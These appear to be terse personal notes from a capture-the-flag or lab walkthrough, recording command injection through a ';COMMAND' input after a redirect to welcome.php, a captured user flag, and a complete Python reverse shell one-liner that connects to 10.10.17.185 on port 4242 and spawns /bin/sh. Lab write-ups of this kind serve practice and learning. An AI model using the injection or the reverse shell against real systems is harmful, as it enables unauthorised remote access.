we are redirected to welcome.php
![[Pasted image 20210930015803.png]]
trying to do ;COMMAND and we get code execution
![[Pasted image 20210930015838.png]]
![[Pasted image 20210930015859.png]]
noulis user
doing ;cat
![[Pasted image 20210930015956.png]]
#userflag  51d236438b333970dbba7dc3089be33b
using 
export RHOST="10.10.17.185";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python reverse shell and we are in 

